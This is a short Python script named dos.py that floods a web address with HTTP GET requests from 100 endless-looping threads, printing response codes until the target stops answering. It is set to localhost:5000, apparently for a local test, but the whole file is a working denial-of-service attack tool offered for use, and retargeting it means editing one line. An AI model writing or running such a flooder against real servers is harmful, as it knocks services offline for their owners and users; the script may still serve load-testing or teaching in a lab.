# dos.py
import threading
import requests

url = "http://localhost:5000/"
threads = 100  # can adjust


def attack():
    while True:
        try:
            response = requests.get(url)
            print(f"Status: {response.status_code}")
        except:
            print("Server down or unreachable")


# Create and start threads
for i in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

input("Press ENTER to stop...\n")

